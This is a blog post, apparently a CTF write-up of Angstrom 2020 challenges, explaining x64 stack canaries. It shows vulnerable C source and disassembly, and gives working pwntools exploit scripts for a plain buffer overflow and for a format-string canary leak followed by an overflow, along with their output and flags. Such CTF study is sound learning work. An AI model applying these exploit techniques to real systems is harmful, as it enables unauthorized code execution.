---
layout: post
title:  "Understanding Linux stack canaries"
date:   2020-3-19 01:11:00 +0100
categories: Linux
---

# Understanding linux stack canaries

For this post i chose to look into how stack canaries mitigate regular stack buffer overflows but also how we can work around them to still pop shells. This post will mainly use examples of canaries in a x64 environment as this is what i was working on at the time, understanding will carry relevance to x86 as well.

All challenges referenced are from Angstrom 2020 ctf.


# Challenge 1 - no_canary

Stack buffer overflow  with no canary.


Provided source:

{% highlight c linenos %}
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

void flag() {
	system("/bin/cat flag.txt");
}

int main() {
	setvbuf(stdin, NULL, _IONBF, 0);
	setvbuf(stdout, NULL, _IONBF, 0);
	gid_t gid = getegid();
	setresgid(gid, gid, gid);

	puts("Ahhhh, what a beautiful morning on the farm!\n");
	puts("       _.-^-._    .--.");
	puts("    .-'   _   '-. |__|");
	puts("   /     |_|     \\|  |");
	puts("  /               \\  |");
	puts(" /|     _____     |\\ |");
	puts("  |    |==|==|    |  |");
	puts("  |    |--|--|    |  |");
	puts("  |    |==|==|    |  |");
	puts("^^^^^^^^^^^^^^^^^^^^^^^^\n");
	puts("Wait, what? It's already noon!");
	puts("Why didn't my canary wake me up?");
	puts("Well, sorry if I kept you waiting.");
	printf("What's your name? ");

	char name[20];
	gets(name);

	printf("Nice to meet you, %s!\n", name);
}

{% endhighlight %}

From the source, we see we are given a free unsafe `gets` call with a defined buffer. This should be fairly straight forward to exploit since we just have to follow our normal proceedure but match it to x64.

```
[fml@DCLXVI:~]$file no_canary 
no_canary: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=e4c94e78496350a02c414f42dc15444e35332fcd, for GNU/Linux 3.2.0, not stripped
```



```
[*] '/home/fml/no_canary'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```


disassembly in GDB:

{% highlight nasm %}
gdb-peda$ info functions
All defined functions:

Non-debugging symbols:
0x0000000000401000  _init
0x0000000000401030  puts@plt
0x0000000000401040  setresgid@plt
0x0000000000401050  system@plt
0x0000000000401060  printf@plt
0x0000000000401070  gets@plt
0x0000000000401080  getegid@plt
0x0000000000401090  setvbuf@plt
0x00000000004010a0  _start
0x00000000004010d0  _dl_relocate_static_pie
0x00000000004010e0  deregister_tm_clones
0x0000000000401110  register_tm_clones
0x0000000000401150  __do_global_dtors_aux
0x0000000000401180  frame_dummy
0x0000000000401186  flag
0x0000000000401199  main
0x00000000004012e0  __libc_csu_init
0x0000000000401350  __libc_csu_fini
0x0000000000401358  _fini
{% endhighlight %}

{% highlight nasm %}
gdb-peda$ disas main
Dump of assembler code for function main:
   0x0000000000401199 <+0>:	push   rbp
   0x000000000040119a <+1>:	mov    rbp,rsp
   0x000000000040119d <+4>:	sub    rsp,0x20
   0x00000000004011a1 <+8>:	mov    rax,QWORD PTR [rip+0x2ec8]        # 0x404070 <stdin@@GLIBC_2.2.5>
   0x00000000004011a8 <+15>:	mov    ecx,0x0
   0x00000000004011ad <+20>:	mov    edx,0x2
   0x00000000004011b2 <+25>:	mov    esi,0x0
   0x00000000004011b7 <+30>:	mov    rdi,rax
   0x00000000004011ba <+33>:	call   0x401090 <setvbuf@plt>
   0x00000000004011bf <+38>:	mov    rax,QWORD PTR [rip+0x2e9a]        # 0x404060 <stdout@@GLIBC_2.2.5>
   0x00000000004011c6 <+45>:	mov    ecx,0x0
   0x00000000004011cb <+50>:	mov    edx,0x2
   0x00000000004011d0 <+55>:	mov    esi,0x0
   0x00000000004011d5 <+60>:	mov    rdi,rax
   0x00000000004011d8 <+63>:	call   0x401090 <setvbuf@plt>
   0x00000000004011dd <+68>:	mov    eax,0x0
   0x00000000004011e2 <+73>:	call   0x401080 <getegid@plt>
   0x00000000004011e7 <+78>:	mov    DWORD PTR [rbp-0x4],eax
   0x00000000004011ea <+81>:	mov    edx,DWORD PTR [rbp-0x4]
   0x00000000004011ed <+84>:	mov    ecx,DWORD PTR [rbp-0x4]
   0x00000000004011f0 <+87>:	mov    eax,DWORD PTR [rbp-0x4]
   0x00000000004011f3 <+90>:	mov    esi,ecx
   0x00000000004011f5 <+92>:	mov    edi,eax
   0x00000000004011f7 <+94>:	mov    eax,0x0
   0x00000000004011fc <+99>:	call   0x401040 <setresgid@plt>
   0x0000000000401201 <+104>:	lea    rdi,[rip+0xe18]        # 0x402020
   0x0000000000401208 <+111>:	call   0x401030 <puts@plt>
   0x000000000040120d <+116>:	lea    rdi,[rip+0xe3a]        # 0x40204e
   0x0000000000401214 <+123>:	call   0x401030 <puts@plt>
   0x0000000000401219 <+128>:	lea    rdi,[rip+0xe45]        # 0x402065
   0x0000000000401220 <+135>:	call   0x401030 <puts@plt>
   0x0000000000401225 <+140>:	lea    rdi,[rip+0xe50]        # 0x40207c
   0x000000000040122c <+147>:	call   0x401030 <puts@plt>
   0x0000000000401231 <+152>:	lea    rdi,[rip+0xe5b]        # 0x402093
   0x0000000000401238 <+159>:	call   0x401030 <puts@plt>
   0x000000000040123d <+164>:	lea    rdi,[rip+0xe66]        # 0x4020aa
   0x0000000000401244 <+171>:	call   0x401030 <puts@plt>
   0x0000000000401249 <+176>:	lea    rdi,[rip+0xe71]        # 0x4020c1
   0x0000000000401250 <+183>:	call   0x401030 <puts@plt>
   0x0000000000401255 <+188>:	lea    rdi,[rip+0xe7c]        # 0x4020d8
   0x000000000040125c <+195>:	call   0x401030 <puts@plt>
   0x0000000000401261 <+200>:	lea    rdi,[rip+0xe59]        # 0x4020c1
   0x0000000000401268 <+207>:	call   0x401030 <puts@plt>
   0x000000000040126d <+212>:	lea    rdi,[rip+0xe7b]        # 0x4020ef
   0x0000000000401274 <+219>:	call   0x401030 <puts@plt>
   0x0000000000401279 <+224>:	lea    rdi,[rip+0xe90]        # 0x402110
   0x0000000000401280 <+231>:	call   0x401030 <puts@plt>
   0x0000000000401285 <+236>:	lea    rdi,[rip+0xea4]        # 0x402130
   0x000000000040128c <+243>:	call   0x401030 <puts@plt>
   0x0000000000401291 <+248>:	lea    rdi,[rip+0xec0]        # 0x402158
   0x0000000000401298 <+255>:	call   0x401030 <puts@plt>
   0x000000000040129d <+260>:	lea    rdi,[rip+0xed7]        # 0x40217b
   0x00000000004012a4 <+267>:	mov    eax,0x0
   0x00000000004012a9 <+272>:	call   0x401060 <printf@plt>
   0x00000000004012ae <+277>:	lea    rax,[rbp-0x20]
   0x00000000004012b2 <+281>:	mov    rdi,rax
   0x00000000004012b5 <+284>:	mov    eax,0x0
   0x00000000004012ba <+289>:	call   0x401070 <gets@plt>
   0x00000000004012bf <+294>:	lea    rax,[rbp-0x20]
   0x00000000004012c3 <+298>:	mov    rsi,rax
   0x00000000004012c6 <+301>:	lea    rdi,[rip+0xec1]        # 0x40218e
   0x00000000004012cd <+308>:	mov    eax,0x0
   0x00000000004012d2 <+313>:	call   0x401060 <printf@plt>
   0x00000000004012d7 <+318>:	mov    eax,0x0
   0x00000000004012dc <+323>:	leave  
   0x00000000004012dd <+324>:	ret    
End of assembler dump.
{% endhighlight %}

Since we are dealing with a 64bit binary, we cant simply overwrite RIP. To find the value of the offset to our instruction pointer we must offset the value from the top of RSP, in this case the gdb pattern was found at length 40. 

Next, we need to get our addresses. Our end goal is to jump to the flag() function, but since its x64, we need to supply a valid return/exit address. I used main since its always available and is a valid address within the binary. (had issues with faking addresses in the past).


Finalised exploit:

{% highlight python %}
from pwn import *

context.arch = 'amd64'
#sh = process("./no_canary")
sh = remote("shell.actf.co", 20700)

offset = "A"*40
main = p64(0x0000000000401199)
flag = p64(0x0000000000401186)

payload = offset
payload += main
payload += flag

sh.recvuntil("name? ")
sh.sendline(payload)
sh.interactive()
{% endhighlight %}


Running the exploit:
```
[fml@DCLXVI:~]$python no_canary.py 
[+] Opening connection to shell.actf.co on port 20700: Done
[*] Switching to interactive mode
Nice to meet you, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x99\x11!
Ahhhh, what a beautiful morning on the farm!

       _.-^-._    .--.
    .-'   _   '-. |__|
   /     |_|     \|  |
  /               \  |
 /|     _____     |\ |
  |    |==|==|    |  |
  |    |--|--|    |  |
  |    |==|==|    |  |
^^^^^^^^^^^^^^^^^^^^^^^^

Wait, what? It's already noon!
Why didn't my canary wake me up?
Well, sorry if I kept you waiting.
What's your name? $ 
Nice to meet you, !
actf{that_gosh_darn_canary_got_me_pwned!}
Segmentation fault
[*] Got EOF while reading in interactive
$  

```


flag: actf{that_gosh_darn_canary_got_me_pwned!}





# Challenge 2 - Canary

Stack buffer overflow with canary present



Given source code;


{% highlight c linenos %}

#define _GNU_SOURCE

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

void flag() {
	system("/bin/cat flag.txt");
}

void wake() {
	puts("Cock-a-doodle-doo! Cock-a-doodle-doo!\n");
	puts("        .-\"-.");
	puts("       / 4 4 \\");
	puts("       \\_ v _/");
	puts("       //   \\\\");
	puts("      ((     ))");
	puts("=======\"\"===\"\"=======");
	puts("         |||");
	puts("         '|'\n");
	puts("Ahhhh, what a beautiful morning on the farm!");
	puts("And my canary woke me up at 5 AM on the dot!\n");
	puts("       _.-^-._    .--.");
	puts("    .-'   _   '-. |__|");
	puts("   /     |_|     \\|  |");
	puts("  /               \\  |");
	puts(" /|     _____     |\\ |");
	puts("  |    |==|==|    |  |");
	puts("  |    |--|--|    |  |");
	puts("  |    |==|==|    |  |");
	puts("^^^^^^^^^^^^^^^^^^^^^^^^\n");
}

void greet() {
	printf("Hi! What's your name? ");
	char name[20];
	gets(name);
	printf("Nice to meet you, ");
	printf(strcat(name, "!\n"));
	printf("Anything else you want to tell me? ");
	char info[50];
	gets(info);
}

int main() {
	setvbuf(stdin, NULL, _IONBF, 0);
	setvbuf(stdout, NULL, _IONBF, 0);
	gid_t gid = getegid();
	setresgid(gid, gid, gid);
	wake();
	greet();
}

{% endhighlight %}


Static analysis of the code we see our challenge and relevant vulnerabilities within. From the name of the challenge, we get the hint that there will most likely be a stack canary present to stop simple stack based buffer overflows. Checksec confirms what we thought.

```
gdb-peda$ checksec
CANARY    : ENABLED
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : FULL
gdb-peda$ 
```





# Stack canary

A stack canary is a secret value placed on the stack which is unique every time the program starts. Before the certain function returns, the value is checked against the initial inset value. If changed, the program will halt, if not it will continue. Its quite similar to SEH but we cant simply poppopret around it. Although canaries are able to be bruteforced (address space), i didnt really see it feasible in this instance as the binary was 64 bit. (A 64 bit bruteforce would be 1.7878 * 10^19 combinations)

{% highlight nasm %}
gdb-peda$ disas greet
Dump of assembler code for function greet:
   0x0000000000400891 <+0>:	push   rbp
   0x0000000000400892 <+1>:	mov    rbp,rsp
   0x0000000000400895 <+4>:	sub    rsp,0x60
   0x0000000000400899 <+8>:	mov    rax,QWORD PTR fs:0x28
   0x00000000004008a2 <+17>:	mov    QWORD PTR [rbp-0x8],rax
   0x00000000004008a6 <+21>:	xor    eax,eax
   0x00000000004008a8 <+23>:	lea    rdi,[rip+0x382]        # 0x400c31
   0x00000000004008af <+30>:	mov    eax,0x0
   0x00000000004008b4 <+35>:	call   0x400660 <printf@plt>
   0x00000000004008b9 <+40>:	lea    rax,[rbp-0x60]
   0x00000000004008bd <+44>:	mov    rdi,rax
   0x00000000004008c0 <+47>:	mov    eax,0x0
   0x00000000004008c5 <+52>:	call   0x400670 <gets@plt>
   0x00000000004008ca <+57>:	lea    rdi,[rip+0x377]        # 0x400c48
   0x00000000004008d1 <+64>:	mov    eax,0x0
   0x00000000004008d6 <+69>:	call   0x400660 <printf@plt>
   0x00000000004008db <+74>:	lea    rax,[rbp-0x60]
   0x00000000004008df <+78>:	mov    rcx,0xffffffffffffffff
   0x00000000004008e6 <+85>:	mov    rdx,rax
   0x00000000004008e9 <+88>:	mov    eax,0x0
   0x00000000004008ee <+93>:	mov    rdi,rdx
   0x00000000004008f1 <+96>:	repnz scas al,BYTE PTR es:[rdi]
   0x00000000004008f3 <+98>:	mov    rax,rcx
   0x00000000004008f6 <+101>:	not    rax
   0x00000000004008f9 <+104>:	lea    rdx,[rax-0x1]
   0x00000000004008fd <+108>:	lea    rax,[rbp-0x60]
   0x0000000000400901 <+112>:	add    rax,rdx
   0x0000000000400904 <+115>:	mov    WORD PTR [rax],0xa21
   0x0000000000400909 <+120>:	mov    BYTE PTR [rax+0x2],0x0
   0x000000000040090d <+124>:	lea    rax,[rbp-0x60]
   0x0000000000400911 <+128>:	mov    rdi,rax
   0x0000000000400914 <+131>:	mov    eax,0x0
   0x0000000000400919 <+136>:	call   0x400660 <printf@plt>
   0x000000000040091e <+141>:	lea    rdi,[rip+0x33b]        # 0x400c60
   0x0000000000400925 <+148>:	mov    eax,0x0
   0x000000000040092a <+153>:	call   0x400660 <printf@plt>
   0x000000000040092f <+158>:	lea    rax,[rbp-0x40]
   0x0000000000400933 <+162>:	mov    rdi,rax
   0x0000000000400936 <+165>:	mov    eax,0x0
   0x000000000040093b <+170>:	call   0x400670 <gets@plt>
   0x0000000000400940 <+175>:	nop
   0x0000000000400941 <+176>:	mov    rax,QWORD PTR [rbp-0x8]
   0x0000000000400945 <+180>:	xor    rax,QWORD PTR fs:0x28
   0x000000000040094e <+189>:	je     0x400955 <greet+196>
   0x0000000000400950 <+191>:	call   0x400630 <__stack_chk_fail@plt>
   0x0000000000400955 <+196>:	leave  
   0x0000000000400956 <+197>:	ret    
End of assembler dump.
{% endhighlight %}

Above is the disassembly of the function `greet` which contains the canary, the text is from local gdb. We can see from the function assembly that in the function prologue at `400899` a pointer is moved into rax. Then at `400941` a very similar qword is again moved into rax and xor'ed. A conditional jump is then made to either return the function or call the `__stack_chk_fail` function. 



# Initial findings.

From the source and just from messing with the binary, we find the format string vulnerability in the first input. From this i immediately thought that the way forward was to leak the canary with the format string then craft an overflow in the 2nd vulnerable `gets` call.



# Investigating the canary

Firstly i wanted to see what i was dealing with. I wanted to see if i could trace the functions and see the canary hit the registers and be stored on the stack. My thinking was, if i could test out format strings in gdb while doing this, i could determine when i hit the canary with my leak, from there i could build the exploit. Sounds simple right? 



# To view the canary;

Open the binary in gdb and disassemble the function with the stack check. You should see something at the end of the function before the return like mentioned above. A `mov` with value into rax, `xor` with said value then conditional jump leading to the stack check.

Place a break point  on the conditional jump (usually JE (Jump if Equal))

Once the function is about to end, the breakpoint will hit and the value of the canary will be in eax/rax. 

Otherwise, a breakpoint can be placed on the creation of the canary `mov rax, QWORD PTR fs:0x28` and you can get the value of the canary before you proceed with debugging the application with input.



# Making contact between head and desk.

Since this was all new to me, i didnt initially trust the patten offsetting i got from gdb as i wasnt sure how the canary was fitting into all of this. I ended up manually debugging the application with data lengths to fill the stack up until the canary. From there i knew the offset was solid and could comfortably trust the canary when re-written would slot in correctly.

View of the stack in gdb;

{% highlight nasm %}
gdb-peda$ x/100xw $rsp
0x7fffffffe270:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffe280:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffe290:	0x42424242	0x42424242	0x42424242	0x42424242
0x7fffffffe2a0:	0x42424242	0x42424242	0x42424242	0x42424242
0x7fffffffe2b0:	0x43434343	0x43434343	0x43434343	0x43434343
0x7fffffffe2c0:	0x43434343	0x43434343	0xdf996000	0xf5bcbea1 << canary
0x7fffffffe2d0:	0xffffe2f0	0x00007fff	0x004009c9	0x00000000
0x7fffffffe2e0:	0xffffe3d0	0x00007fff	0x00000000	0x000003e8
{% endhighlight %}


I ended up playing with the format string vulnerability quite a lot with this application. I wanted to see what kind of data i could get from the stack before it was overwritten.

I came up with a pattern of `%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx` which would print the canary as the last long-long entry.

I then reviewed my notes on format strings and remembered i could simplify the entry to leak specific locations denoted by the distance. Simplified the pattern to just `%17$llx`, which would only print the 17th value. This would help out later in the exploit parsing as less rubbish had to be cut out.


# Exploit building

For this i had to use the pwntools library for python. I hadnt used it much in the past but i was forced to dig into the documentation to figure out the best way to parse the canary from the leak. Overall it was much easier than i first anticipated as most of the work is done for you if you get your leak right.

The desired plan for the exploit was written as follows;
```
- Recieve all data from server until input is needed
- Send our format string to leak the canary (%17$llx)
- Recieve the canary from the output of the program
- Parse the canary into a useable string for our payload
- Create the rest of the payload;
	- [ payload = padding + canary + padding + main() + flag() ]
- Send the payload in the 2nd input
- Recieve all the remaining data (segfault and or flag)
```

<br>
Finished exploit:

{% highlight python %}
from pwn import *
from struct import pack
import sys

# for canary challenge angstrom 2020

# leak = '%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx'

context.arch='amd64'
#sh = process("./canary")
sh = remote("shell.actf.co",20701)

#p = lambda x : pack("<QQ",x)
canary =''
leak = "%17$llp" # %p appends '0x' which doesnt break pwntools packing

offset = "A"*56
padding = "A"*8
flag = p64(0x0000000000400787)
main = p64(0x0000000000400957)

sh.recvuntil("name? ")
sh.sendline(leak)
cookie = sh.recvuntil("!")
# recieve the canary
cookie = cookie.split(", ")[1]
print("[?] Canary:"+cookie[:len(cookie)-1])
# parse the canary
canary = cookie[2:len(cookie)-1].decode("hex")[::-1]
print("[?] Canary redone")
print(canary)

payload = ''
payload += offset
payload += canary
payload += padding
payload += main
payload += flag

sh.recvuntil("me? ")
sh.sendline(payload)
print("[?] Payload sent")
print("[?] Recall main(), flag()")
print("[?] Enter through process") # since i call main(), just need the func to exit gracefully.
#sh.recvall()
sh.interactive()
{% endhighlight %}

```
[fml@DCLXVI:~]$python canary.py 
[+] Opening connection to shell.actf.co on port 20701: Done
[?] Canary:0x2025a303ba77b200
[?] Canary redone
\x00w\xba\x03% 
[?] Payload sent
[?] Recall main(), flag()
[?] Enter through process
[*] Switching to interactive mode
Cock-a-doodle-doo! Cock-a-doodle-doo!

        .-"-.
       / 4 4 \
       \_ v _/
       //   \\
      ((     ))
=======""===""=======
         |||
         '|'

Ahhhh, what a beautiful morning on the farm!
And my canary woke me up at 5 AM on the dot!

       _.-^-._    .--.
    .-'   _   '-. |__|
   /     |_|     \|  |
  /               \  |
 /|     _____     |\ |
  |    |==|==|    |  |
  |    |--|--|    |  |
  |    |==|==|    |  |
^^^^^^^^^^^^^^^^^^^^^^^^

Hi! What's your name? $ 
Nice to meet you, $ 
!
Anything else you want to tell me? actf{youre_a_canary_killer_>:(}
Segmentation fault
[*] Got EOF while reading in interactive
$  
```

flag: actf{youre_a_canary_killer_>:(}
<br>
Overall this was a fun challenge, i hadnt encountered stack canaries in x64 binaries before so i found it good to research how to get around them with a leak and how pwntools can do the messy work.

# Challenge 3 - LIBrary in c

coming soon.

This challenge was similar again but with another step up, along with leaking the canary, we needed to leak the base (or relevant address) of libc to create a ret2libc exploit instead of a traditional overflow.
